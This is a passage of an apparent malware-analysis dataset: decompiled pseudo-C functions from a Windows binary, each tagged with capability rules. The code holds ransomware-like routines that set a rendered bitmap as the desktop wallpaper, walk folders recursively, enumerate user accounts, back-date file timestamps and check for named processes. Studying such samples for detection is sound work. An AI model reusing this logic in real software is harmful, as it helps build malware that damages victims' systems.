fcn.00415506(uVar2);\n    if (var_8h != 0) {\n        uVar2 = fcn.0040a88f(0x418a84, 4, 0x61e1c26a, 0);\n        puVar7 = &var_28h;\n        fcn.00415506(uVar2, puVar7);\n        uVar2 = fcn.00415629();\n        pvParam = fcn.00407d6d(arg_8h, uVar2, puVar7);\n        if ((pvParam != 0) && (iVar3 = (*_sym.imp.USER32.dll_GetDC)(0),  iVar3 != 0)) {\n            hDC = iVar3;\n            iVar4 = (*_sym.imp.GDI32.dll_CreateCompatibleDC)(iVar3);\n            pcVar1 = _sym.imp.GDI32.dll_GetDeviceCaps;\n            var_2ch = iVar4;\n            if (iVar4 != 0) {\n                nWidth = (*_sym.imp.GDI32.dll_GetDeviceCaps)(iVar3, 8);\n                var_10h = (*pcVar1)(hDC, 10);\n                hgdiobj = (*_sym.imp.GDI32.dll_CreateCompatibleBitmap)(hDC, nWidth, var_10h);\n                if (hgdiobj != 0) {\n                    var_28h = (*_sym.imp.GDI32.dll_SelectObject)(iVar4, hgdiobj);\n                    var_1ch = fcn.0040a88f(0x418a8c, 4, 0x1af56133, 0);\n                    uVar2 = (*pcVar1)(hDC, 0x5a, 0x48);\n                    fcn.00415506(var_1ch, uVar2);\n                    uVar2 = fcn.004155c2();\n                    iVar3 = (*_sym.imp.KERNEL32.dll_MulDiv)(uVar2);\n                    uVar2 = fcn.0040acd8(0x418a94, 8, 0x9fbe8ce0);\n                    var_40h = (*_sym.imp.GDI32.dll_CreateFontW)(-iVar3, 0, 0, 0, 0, 0, 0, 0, 1, 0, 0, 4, 0, uVar2);\n                    if (var_40h != 0) {\n                        var_44h = (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_40h);\n                        uVar2 = fcn.0040a88f(0x418aa0, 10, 0x6124a0ae, 0);\n                        fcn.00415506(uVar2);\n                        uVar2 = fcn.004155c2();\n                        (*_sym.imp.GDI32.dll_SetBkColor)(iVar4, uVar2);\n                        uVar2 = fcn.0040a88f(0x418aac, 5, 0xd0916568, 0);\n                        fcn.00415506(uVar2);\n                        uVar2 = fcn.004155c2();\n                        (*_sym.imp.GDI32.dll_SetTextColor)(iVar4, uVar2);\n                        var_4ch = nWidth;\n                        lprc = 0;\n                        var_38h = 0;\n                        var_34h = nWidth;\n                        var_30h = var_10h;\n                        uVar2 = (*_sym.imp.GDI32.dll_GetStockObject)(2);\n                        (*_sym.imp.USER32.dll_FillRect)(iVar4, &lprc, uVar2);\n                        uVar6 = (var_10h * var_4ch) / 10;\n                        pcVar1 = _sym.imp.USER32.dll_DrawTextA;\n                        var_48h = var_10h;\n                        uVar5 = var_8h;\n                        while (var_8h = uVar6,  _sym.imp.USER32.dll_DrawTextA = pcVar1,  var_10h = var_48h,  var_8h != 0\n                              ) {\n                            uVar5 = fcn.0040c985();\n                            var_1ch = (uVar5 & 0xff) << 8;\n                            uVar5 = fcn.0040c985();\n                            uVar6 = uVar5 & 0xff | var_1ch;\n                            uVar5 = fcn.0040c985();\n                            uVar2 = fcn.0040c985(uVar5 & 0xff | uVar6 << 8);\n                            uVar2 = fcn.0040c985(uVar2);\n                            (*_sym.imp.GDI32.dll_SetPixel)(iVar4, uVar2);\n                            uVar5 = var_8h - 1;\n                            pcVar1 = _sym.imp.USER32.dll_DrawTextA;\n                            var_48h = var_10h;\n                            var_4ch = nWidth;\n                            uVar6 = uVar5;\n                        }\n                        var_54h = 0;\n                        var_50h = 0;\n                        var_8h = uVar5;\n                        (*pcVar1)(iVar4, pvParam, 0xffffffff, &var_54h, 0x411);\n                        var_38h = var_30h / 2 - var_48h / 2;\n                        (*pcVar1)(iVar4, pvParam, 0xffffffff, &lprc, 0x11);\n                        (*_sym.imp.GDI32.dll_GetObjectW)(hgdiobj, 0x18, &lpvObject);\n                        puVar7 = &var_88h;\n                        for (iVar3 = 9; iVar3 != 0; iVar3 = iVar3 + -1) {\n                            *puVar7 = 0;\n                            puVar7 = puVar7 + 1;\n                        }\n                        var_88h = var_a0h;\n                        var_80h._0_2_ = 1;\n                        iVar3 = var_a0h * 0x20 + 0x1f;\n                        var_80h._2_2_ = 0x20;\n                        iVar3 = ((iVar3 >> 0x1f & 0x1fU) + iVar3 >> 5) * cScanLines * 4;\n                        lpbi = 0x28;\n                        var_84h = cScanLines;\n                        var_7ch = 0;\n                        var_8h = fcn.0040ae05(0);\n                        if (var_8h != 0) {\n                            (*_sym.imp.GDI32.dll_GetDIBits)(hDC, hgdiobj, 0, cScanLines, var_8h, &lpbi, 0);\n                            uVar2 = fcn.0040acd8(0x418ab4, 4, 0x3f9d7994);\n                            pvParam = fcn.0040ca20(uVar2);\n                            if (pvParam != 0) {\n                                nWidth = (*_sym.imp.KERNEL32.dll_CreateFileW)(pvParam, 0x40000000, 1, 0, 2, 0x80, 0);\n                                pcVar1 = _sym.imp.KERNEL32.dll_WriteFile;\n                                if (nWidth != -1) {\n                                    uStack98 = 0;\n                                    var_62h = iVar3 + 0x36;\n                                    var_64h = 0x4d42;\n                                    var_5ah = 0x36;\n                                    var_10h = 0;\n                                    (*_sym.imp.KERNEL32.dll_WriteFile)(nWidth, &var_64h, 0xe, &var_10h, 0);\n                                    (*pcVar1)(nWidth, &lpbi, 0x28, &var_10h, 0);\n                                    iVar4 = nWidth;\n                                    (*pcVar1)(nWidth, var_8h, iVar3, &var_10h, 0);\n                                    lpLastAccessTime = 0x18894;\n                                    var_1ch = 0x18894;\n                                    (*_sym.imp.KERNEL32.dll_SetFileTime)\n                                              (iVar4, &lpLastAccessTime, &lpLastAccessTime, &lpLastAccessTime);\n                                    fcn.0040c13c();\n                                    (*_sym.imp.USER32.dll_SystemParametersInfoW)(0x14, 0, pvParam, 3);\n                                }\n                                fcn.0040af12();\n                            }\n                            fcn.0040af12();\n                        }\n                        (*_sym.imp.GDI32.dll_SelectObject)(var_2ch, var_44h);\n                        (*_sym.imp.GDI32.dll_DeleteObject)(var_40h);\n                        iVar4 = var_2ch;\n                    }\n                    (*_sym.imp.GDI32.dll_SelectObject)(iVar4, var_28h);\n                    (*_sym.imp.GDI32.dll_DeleteObject)(hgdiobj);\n                }\n                (*_sym.imp.GDI32.dll_DeleteDC)(iVar4);\n            }\n            (*_sym.imp.USER32.dll_ReleaseDC)(0, hDC);\n        }\n    }\n    return;\n}\n",
        "token_count": 2374
    },
    "004096c5": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.004096c5(uint arg_8h)\n\n{\n    uint uVar1;\n    int32_t iVar2;\n    uint *unaff_EDI;\n    uint lpFileName;\n    uint lpNumberOfBytesWritten;\n    uint lpLastAccessTime;\n    uint var_8h;\n    \n    uVar1 = fcn.0040acd8(0x418abc, 5, 0xa1e9b028, arg_8h, *unaff_EDI);\n    (*_sym.imp.USER32.dll_wsprintfW)(&lpFileName, uVar1);\n    iVar2 = (*_sym.imp.KERNEL32.dll_CreateFileW)(&lpFileName, 0x40000000, 0, 0, 1, 0, 0);\n    if (iVar2 != -1) {\n        (*_sym.imp.KERNEL32.dll_WriteFile)(iVar2, unaff_EDI[1], unaff_EDI[2], &lpNumberOfBytesWritten, 0);\n        lpLastAccessTime = 0x18894;\n        var_8h = 0x18894;\n        (*_sym.imp.KERNEL32.dll_SetFileTime)(iVar2, &lpLastAccessTime, &lpLastAccessTime, &lpLastAccessTime);\n        fcn.0040c13c();\n    }\n    return;\n}\n",
        "token_count": 291
    },
    "0040a06d": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040a06d(uint arg_8h, code *arg_ch, uint arg_10h, int32_t arg_14h, int32_t arg_18h)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    int32_t iVar4;\n    uint8_t auStack1652 [4];\n    uint uStack1648;\n    uchar auStack1644 [20];\n    int32_t iStack1624;\n    uint32_t uStack1620;\n    uchar auStack1608 [552];\n    uchar auStack1056 [8];\n    uchar auStack1048 [1044];\n    \n    cVar2 = fcn.0040ce72(auStack1048, arg_8h);\n    if (cVar2 != '\\0') {\n        sub.ntdll.dll_memset(auStack1644, 0, 0x250);\n        uStack1648 = 1;\n        iVar3 = (*_sym.imp.KERNEL32.dll_FindFirstFileW)(auStack1048, auStack1644);\n        pcVar1 = _sym.imp.KERNEL32.dll_Sleep;\n        if (iVar3 != -1) {\n            do {\n                iVar4 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(*0x41d8e0, 0);\n                if (iVar4 == 0) break;\n                cVar2 = fcn.0040ce9e();\n                if (cVar2 == '\\0') {\n                    if ((auStack1652[0] & 0x10) == 0) {\n                        cVar2 = fcn.00409a7d(auStack1056);\n                        if ((((cVar2 != '\\0') || (cVar2 = fcn.00409a7d(auStack1056),  cVar2 == '\\0')) &&\n                            (*0x41c6a4 <= iStack1624)) &&\n                           (((*0x41c6a4 < iStack1624 || (*0x41c6a0 <= uStack1620)) &&\n                            (iVar4 = (*_sym.imp.SHLWAPI.dll_StrChrW)(auStack1608, 0x2e),  iVar4 != 0)))) {\n                            iVar4 = (*arg_ch)(arg_8h, &stack0xfffff988, arg_10h);\n                            if (iVar4 == 0) break;\n                            if (arg_18h != 0) {\n                                (*pcVar1)(arg_18h);\n                            }\n                        }\n                    }\n                    else {\n                        cVar2 = fcn.0040ce72(auStack1056, arg_8h);\n                        if (cVar2 != '\\0') {\n                            if (arg_14h != 0) {\n                                (*pcVar1)(arg_14h);\n                            }\n                            fcn.0040a06d(auStack1056, arg_ch, arg_10h, arg_18h, arg_14h);\n                        }\n                    }\n                }\n                iVar4 = (*_sym.imp.KERNEL32.dll_FindNextFileW)(iVar3, auStack1652);\n            } while (iVar4 != 0);\n            (*_sym.imp.KERNEL32.dll_FindClose)(iVar3);\n        }\n    }\n    return;\n}\n",
        "token_count": 718
    },
    "0040c13c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.0040c13c(void)\n\n{\n    int32_t iVar1;\n    int32_t unaff_ESI;\n    uint lpdwFlags;\n    \n    if (((unaff_ESI != 0) && (unaff_ESI != -1)) &&\n       (iVar1 = (*_sym.imp.KERNEL32.dll_GetHandleInformation)(),  iVar1 != 0)) {\n        iVar1 = (*_sym.imp.KERNEL32.dll_CloseHandle)();\n        return iVar1 != 0;\n    }\n    return false;\n}\n",
        "token_count": 115
    },
    "0040c175": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.0040c175(uint pszSrch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint uVar4;\n    uint var_22ch;\n    uint s;\n    uint var_224h;\n    uint pszFirst;\n    \n    cVar1 = fcn.0040f898(pszSrch);\n    if (cVar1 != '\\0') {\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateToolhelp32Snapshot)(2, 0);\n        uVar4 = 0;\n        if (iVar2 != -1) {\n            sub.ntdll.dll_memset(&s, 0, 0x228);\n            var_22ch = 0x22c;\n            iVar3 = (*_sym.imp.KERNEL32.dll_Process32FirstW)(iVar2, &var_22ch);\n            while ((uVar4 = 0,  iVar3 != 0 &&\n                   (iVar3 = (*_sym.imp.SHLWAPI.dll_StrStrIW)(&pszFirst, pszSrch),  uVar4 = var_224h,  iVar3 == 0))) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_Process32NextW)(iVar2, &var_22ch);\n            }\n            fcn.0040c13c();\n        }\n        return uVar4;\n    }\n    return 0;\n}\n",
        "token_count": 307
    },
    "0040cbc0": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.0040cbc0(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0040f898(param_1);\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(param_1);\n    return iVar2 != -1;\n}\n",
        "token_count": 92
    },
    "0040cbeb": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nbool fcn.0040cbeb(uint param_1)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    \n    cVar1 = fcn.0040f8eb(param_1);\n    if (cVar1 == '\\0') {\n        return false;\n    }\n    iVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesA)(param_1);\n    return iVar2 != -1;\n}\n",
        "token_count": 93
    },
    "0040d186": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nvoid __cdecl fcn.0040d186(char *arg_8h)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint32_t var_ch;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    do {\n        var_10h = 0;\n        var_ch = 0;\n        var_14h = 0;\n        var_4h = 0;\n        iVar1 = (*_sym.imp.NETAPI32.dll_NetUserEnum)(0, 0, 2, &var_4h, 0xffffffff, &var_ch, &var_14h, &var_10h);\n        if ((iVar1 != 0) && (iVar1 != 0xea)) {\n            return;\n        }\n        if (var_4h != 0) {\n            uVar3 = 0;\n            if (var_ch != 0) {\n                do {\n                    var_8h = 0;\n                    iVar2 = (*_sym.imp.NETAPI32.dll_NetUserGetInfo)(0, *(var_4h + uVar3 * 4), 0x17, &var_8h);\n                    if ((iVar2 == 0) && (var_8h != 0)) {\n                        if (*arg_8h == '\\0') {\n                            iVar2 = (**(arg_8h + 8))(*(var_8h + 0x10));\n                        }\n                        else {\n                            iVar2 = (**(arg_8h + 8))(*(var_8h + 0x10), *(arg_8h + 4));\n                        }\n                        if (iVar2 != 0) {\n                            iVar1 = -1;\n                        }\n                        (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_8h);\n                    }\n                } while ((iVar1 != -1) && (uVar3 = uVar3 + 1,  uVar3 < var_ch));\n            }\n            (*_sym.imp.NETAPI32.dll_NetApiBufferFree)(var_4h);\n        }\n    } while (iVar1 == 0xea);\n    return;\n}\n",
        "token_count": 488
    },
    "0040f36c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.0040f36c(int16_t *param_1)\n\n{\n    int16_t iVar1;\n    char cVar2;\n    int16_t *piVar3;\n    uint32_t uVar4;\n    \n    cVar2 = fcn.0040f898(param_1);\n    if (cVar2 == '\\0') {\n        return 0;\n    }\n    piVar3 = (*_sym.imp.SHLWAPI.dll_PathSkipRootW)(param_1);\n    if (piVar3 == NULL) {\n        piVar3 = param_1;\n    }\n    do {\n        iVar1 = *piVar3;\n        if (((iVar1 == 0x5c) || (iVar1 == 0x2f)) || (iVar1 == 0)) {\n            *piVar3 = 0;\n            uVar4 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(param_1);\n            if (uVar4 == 0xffffffff) {\n                uVar4 = (*_sym.imp.KERNEL32.dll_CreateDirectoryW)(param_1, 0);\n            }\n            else {\n                uVar4 = uVar4 & 0x10;\n            }\n            if (uVar4 == 0) {\n                return 0;\n            }\n            if (iVar1 == 0) {\n                return 1;\n            }\n            *piVar3 = iVar1;\n        }\n        piVar3 = piVar3 + 1;\n    } while( true );\n}\n",
        "token_count": 325
    },
    "0040f55e": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint32_t __cdecl fcn.0040f55e(uint arg_8h, uint arg_ch)\n\n{\n    code *pcVar1;\n    char cVar2;\n    int32_t iVar3;\n    uint lpCreationTime;\n    uint lpLastAccessTime;\n    uint lpLastWriteTime;\n    uint32_t var_4h;\n    \n    cVar2 = fcn.0040f898(arg_8h);\n    if ((cVar2 == '\\0') || (cVar2 = fcn.0040f898(arg_ch),  pcVar1 = _sym.imp.KERNEL32.dll_CreateFileW,  cVar2 == '\\0'))\n    {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0;\n        iVar3 = (*_sym.imp.KERNEL32.dll_CreateFileW)(arg_8h, 0x80000000, 1, 0, 3, 0x2000000, 0);\n        if (iVar3 != -1) {\n            (*_sym.imp.KERNEL32.dll_GetFileTime)(iVar3, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n            fcn.0040c13c();\n            iVar3 = (*pcVar1)(arg_ch, 0x100, 0, 0, 3, 0x2000000, 0);\n            if (iVar3 != -1) {\n                iVar3 = (*_sym.imp.KERNEL32.dll_SetFileTime)\n                                  (iVar3, &lpCreationTime, &lpLastAccessTime, &lpLastWriteTime);\n                var_4h = iVar3 != 0;\n                fcn.0040c13c();\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 387
    },
    "0040f619": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t fcn.0040f619(uint param_1)\n\n{\n    int32_t iVar1;\n    int32_t iVar2;\n    uint unaff_retaddr;\n    \n    iVar1 = (*_sym.imp.WS2_32.dll_inet_addr)(param_1);\n    if (iVar1 == -1) {\n        iVar2 = (*_sym.imp.WS2_32.dll_gethostbyname)(unaff_retaddr);\n        if (iVar2 != 0) {\n            iVar1 = ***(iVar2 + 0xc);\n        }\n    }\n    return iVar1;\n}\n",
        "token_count": 127
    },
    "00410f7c": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nint32_t __cdecl fcn.00410f7c(uint32_t arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    uint8_t *puVar4;\n    uint uVar5;\n    int32_t iVar6;\n    uint32_t uVar7;\n    int32_t *piVar8;\n    uint32_t uVar9;\n    uint var_18h;\n    uint var_14h;\n    uint lpHandles;\n    uint8_t *var_ch;\n    uint32_t var_8h;\n    int32_t var_4h;\n    \n    cVar1 = fcn.0040f84a(arg_ch, arg_8h << 2);\n    if (cVar1 == '\\0') {\n        var_4h = 0;\n    }\n    else {\n        var_4h = 0;\n        if (arg_8h < 0x41) {\n            var_4h = (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(arg_8h, arg_ch, 1, 0xffffffff);\n        }\n        else {\n            iVar2 = (*_sym.imp.KERNEL32.dll_CreateEventW)(0, 1, 0, 0);\n            if (iVar2 != 0) {\n                uVar7 = arg_8h >> 6;\n                if ((arg_8h & 0x3f) != 0) {\n                    uVar7 = uVar7 + 1;\n                }\n                iVar3 = fcn.0040ae05(0);\n                if (iVar3 != 0) {\n                    puVar4 = fcn.0040ae05(8);\n                    if (puVar4 != NULL) {\n                        var_8h = 0;\n                        if (uVar7 != 0) {\n                            iVar6 = 0xc;\n                            var_ch = puVar4;\n                            do {\n                                piVar8 = *var_ch;\n                                *piVar8 = iVar2;\n                                piVar8[1] = var_8h << 6;\n                                uVar9 = 0x40;\n                                if (arg_8h < 0x40) {\n                                    uVar9 = arg_8h;\n                                }\n                                piVar8[2] = uVar9;\n                                sub.ntdll.dll_memcpy(*(iVar6 + piVar8), *(arg_ch + -0xc + iVar6), uVar9 << 2);\n                                piVar8[0x44] = -1;\n                                piVar8[0x43] = 1;\n                                piVar8[0x45] = -2;\n                                uVar5 = (*_sym.imp.KERNEL32.dll_CreateThread)(0, 0, 0x410eeb, piVar8, 0, 0);\n                                var_ch = var_ch + 0x118;\n                                *(iVar3 + var_8h * 4) = uVar5;\n                                arg_8h = arg_8h - piVar8[2];\n                                var_8h = var_8h + 1;\n                                iVar6 = iVar6 + 0x100;\n                            } while (var_8h < uVar7);\n                        }\n                        (*_sym.imp.KERNEL32.dll_WaitForMultipleObjects)(uVar7, iVar3, 1, 0xffffffff);\n                        uVar9 = 0;\n                        if (uVar7 != 0) {\n                            do {\n                                var_4h = *(*puVar4 + 0x114);\n                                if ((var_4h == 0x102) || (var_4h == -1)) break;\n                                uVar9 = uVar9 + 1;\n                                puVar4 = puVar4 + 0x118;\n                            } while (uVar9 < uVar7);\n                        }\n                        uVar9 = 0;\n                        if (uVar7 != 0) {\n                            do {\n                                fcn.0040c13c();\n                                uVar9 = uVar9 + 1;\n                            } while (uVar9 < uVar7);\n                        }\n                        fcn.0040af12();\n                    }\n                    fcn.0040af12();\n                }\n                fcn.0040c13c();\n            }\n        }\n    }\n    return var_4h;\n}\n",
        "token_count": 940
    },
    "00415f40": {
        "rules": [
            "check if file exists/c301f2ef4d414d12851aaf7cbada9e20/bb34a6814d684c5e93a48a12384793c1"
        ],
        "decompiled_code": "\nuint fcn.00415f40(int32_t param_1, int32_t param_2, uint param_3)\n\n{\n    code *pcVar1;\n    int32_t iVar2;\n    int32_t iVar3;\n    int32_t extraout_ECX;\n    uchar *puVar4;\n    int32_t iVar5;\n    int32_t iStack12;\n    uint uStack8;\n    \n    puVar4 = &stack0xfffffffc;\n    if ((*(param_1 + 4) & 6) == 0) {\n        iStack12 = param_1;\n        uStack8 = param_3;\n        *(param_2 + -4) = &iStack12;\n        iVar5 = *(param_2 + 0xc);\n        iVar3 = *(param_2 + 8);\n        iVar2 = fcn.0041617d(param_2);\n        if (iVar2 == 0) {\n            *(param_1 + 4) = *(param_1 + 4) | 8;\n        }\n        else {\n            for (; iVar5 != -1; iVar5 = *(iVar3 + iVar5 * 0xc)) {\n                pcVar1 = *(iVar3 + 4 + iVar5 * 0xc);\n                if (pcVar1 != NULL) {\n                    iVar3 = (*pcVar1)();\n                    param_2 = *(puVar4 + 0xc);\n                    if (iVar3 != 0) {\n                        if (iVar3 < 0) {\n                            return 0;\n                        }\n                        iVar3 = *(param_2 + 8);\n                        fcn.00416068(param_2);\n                        puVar4 = param_2 + 0x10;\n                        fcn.004160c3(param_2, iVar5);\n                        fcn.0041615f(1);\n                        *(param_2 + 0xc) = *(iVar3 + extraout_ECX * 4);\n                        param_2 = 0;\n                        iVar5 = 0;\n                        (**(iVar3 + 8 + extraout_ECX * 4))();\n                    }\n                }\n                iVar3 = *(param_2 + 8);\n            }\n        }\n    }\n    else {\n        fcn.004160c3(param_2, 0xffffffff, &stack0xfffffffc, &stack0xfffffffc);\n    }\n    return 1;\n}\n",
        "token_count": 512
    },
    "00401b07": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401b07(int32_t arg_8h, uint arg_ch, uint *arg_10h)\n\n{\n    char cVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint in_ECX;\n    uint var_4h;\n    \n    arg_8h_00 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9);\n    iVar2 = (*_sym.imp.KERNEL32.dll_lstrlenW)(arg_8h);\n    if (*(arg_8h + -2 + iVar2 * 2) == 0x5c) {\n        arg_8h_00 = fcn.0040acd8(0x417b68, 4, 0x5a8596ad);\n    }\n    iVar2 = fcn.0040beef(arg_8h_00, arg_8h);\n    if (iVar2 != 0) {\n        iVar2 = fcn.0040cbc0(in_ECX);\n        if (iVar2 != 0) {\n            cVar1 = fcn.004011f6(in_ECX);\n            if (cVar1 == '\\0') {\n                fcn.004012ed(in_ECX, 0, 1);\n                *arg_10h = 1;\n            }\n        }\n        fcn.0040af12();\n    }\n    return 1;\n}\n",
        "token_count": 317
    },
    "00405673": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405673(uint arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    uint32_t uVar2;\n    uint arg_ch_00;\n    uint var_20ch;\n    \n    uVar2 = (*_sym.imp.KERNEL32.dll_GetFileAttributesW)(arg_8h);\n    if ((uVar2 & 6) == 0) {\n        arg_ch_00 = fcn.0040acd8(0x417b60, 5, 0xb4d7cbf9, arg_8h, arg_ch + 0x30);\n        fcn.0040be75(&var_20ch, arg_ch_00, arg_8h);\n        cVar1 = fcn.00405345(&var_20ch);\n        if (cVar1 != '\\0') {\n            fcn.004054cb(&var_20ch);\n        }\n    }\n    return 1;\n}\n",
        "token_count": 211
    },
    "00405ed0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00405ed0(uint arg_8h, int32_t arg_ch, uchar *arg_10h)\n\n{\n    uchar uVar1;\n    uint arg_8h_00;\n    int32_t iVar2;\n    uint uStack100;\n    uint uStack96;\n    uint uStack92;\n    uint uStack88;\n    uint uStack84;\n    uint uStack80;\n    uchar auStack76 [72];\n    \n    arg_8h_00 = fcn.0040acd8(0x41852c, 7, 0xe02ef63d, arg_8h, arg_ch + 0x30);\n    iVar2 = fcn.0040beef(arg_8h_00, arg_8h);\n    if (iVar2 != 0) {\n        sub.ntdll.dll_memset(auStack76, 0, 0x40);\n        uStack96 = 0;\n        uStack92 = 0;\n        uStack88 = 0;\n        uStack84 = 0;\n        uStack80 = 0x44;\n        iVar2 = (*_sym.imp.KERNEL32.dll_CreateProcessW)(0, uStack100, 0, 0, 1, 0x1000000, 0, 0, &uStack80, &uStack96);\n        if (iVar2 != 0) {\n            fcn.0040c13c();\n            fcn.0040c13c();\n            (*_sym.imp.KERNEL32.dll_Sleep)(10000);\n            uVar1 = fcn.00406406();\n            *arg_10h = uVar1;\n        }\n        fcn.0040af12();\n    }\n    return 1;\n}\n",
        "token_count": 380
    },
    "00402af1": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuchar fcn.00402af1(void)\n\n{\n    char cVar1;\n    uint uVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint var_28h;\n    uint var_24h;\n    uint var_20h;\n    uint var_1ch;\n    uint var_18h;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    uVar2 = fcn.0040acd8(0x417e8c, 0x11, 0x83b065d8);\n    cVar1 = fcn.004028b0(uVar2);\n    if (cVar1 == '\\0') {\n        uVar2 = fcn.0040acd8(0x417ea0, 9, 0xb6c5f784);\n        cVar1 = fcn.004028b0(uVar2);\n        if (cVar1 == '\\0') {\n            var_28h = fcn.0040acd8(0x417eac, 0xd, 0x42a43222);\n            var_24h = fcn.0040acd8(0x417ebc, 0xb, 0xb43fdb79);\n            var_20h = fcn.0040acd8(0x417ec8, 0xb, 0x42c0e6ed);\n            var_1ch = fcn.0040acd8(0x417ed4, 8, 0xa9bd601a);\n            var_18h = fcn.0040acd8(0x417ee0, 0xf, 0xcbc33e19);\n            var_14h = fcn.0040acd8(str.Ur_t, 0xd, 0xd8373a41);\n            var_10h = fcn.0040acd8(str._, 0xb, 0x387f28c2);\n            var_ch = fcn.0040acd8(0x417f0c, 0x11, 0x6ffc74aa);\n            var_8h = fcn.0040acd8(0x417f20, 0x10, 0xb7286953);\n            var_4h = fcn.0040acd8(0x417f34, 0xd, 0x1dd957d0);\n            uVar4 = 0;\n            do {\n                iVar3 = fcn.0040c175((&var_28h)[uVar4]);\n                if (iVar3 != 0) {\n                    return 1;\n                }\n                uVar4 = uVar4 + 1;\n            } while (uVar4 < 10);\n            return 0;\n        }\n    }\n    return 1;\n}\n",
        "token_count": 630
    },
    "004056d9": {
        "rules": [
            "check OS version/4b1f5bfe83db45b5a81c3c2e0ddf7ce2"
        ],
        "decompiled_code": "\nuint32_t fcn.004056d9(void)\n\n{\n    uint uVar1;\n    uint32_t uVar2;\n    uint *puVar3;\n    uint uVar4;\n    int32_t iVar5;\n    uint extraout_ECX;\n    uint extraout_ECX_00;\n    uint extraout_ECX_01;\n    uint extraout_ECX_02;\n    uint *puVar6;\n    uint var_538h;\n    uint lpBuffer;\n    uint var_128h;\n    uint32_t s;\n    uint var_4h;\n    \n    var_128h = 0;\n    sub.ntdll.dll_memset(&s, 0, 0x118);\n    uVar2 = fcn.0040f255();\n    if (s < 10) {\n        *0x41d8dc = 0xe28;\n        puVar3 = fcn.0040ae05(0);\n        uVar1 = _sym.imp.KERNEL32.dll_ExitProcess;\n        puVar3[2] = _sym.imp.KERNEL32.dll_CreateProcessA;\n        uVar4 = _sym.imp.KERNEL32.dll_CreateProcessW;\n        *0x41d6cc = puVar3;\n        puVar3[3] = uVar1;\n        puVar3[1] = uVar4;\n        uVar4 = fcn.0040a88f(0x4182a8, 0x1e, 0x299921de, 0);\n        uVar4 = fcn.0040acd8(0x4180e8, 0xc, 0x524f9883, extraout_ECX, uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetModuleHandleW)(uVar4);\n        uVar4 = (*_sym.imp.KERNEL32.dll_GetProcAddress)(uVar4);\n        *puVar3 = uVar4;\n        (*_sym.imp.KERNEL32.dll_lstrcpyW)(puVar3 + 4, 0x41dc10);\n        fcn.0040d45a();\n        (*_sym.imp.KERNEL32.dll_GetSystemDirectoryW)(&lpBuffer, 0x104);\n        puVar6 = &lpBuffer;\n        uVar4 = fcn.0040a88f(0x4182c8, 0x2a, 0xd76e7421, 0);\n        fcn.0040beb2(puVar3 + 0x86, uVar4, puVar6);\n        puVar6 = &lpBuffer;\n        uVar4 = fcn.0040a88f(0x4182f4, 0x22, 0x3b12ebaf, 0);\n        